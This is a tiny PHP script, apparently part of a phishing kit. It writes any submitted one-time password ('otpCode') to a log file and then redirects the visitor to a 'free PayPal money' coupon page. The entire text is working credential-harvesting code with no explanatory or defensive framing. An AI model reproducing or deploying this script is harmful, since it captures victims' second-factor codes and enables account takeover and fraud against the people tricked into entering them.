<?php

    file_put_contents("log.txt", "OTP: " . $_POST['otpCode'] . "\n", FILE_APPEND);
header('Location: https://www.couponxoo.com/free-paypal-money-promos?amp');
exit();
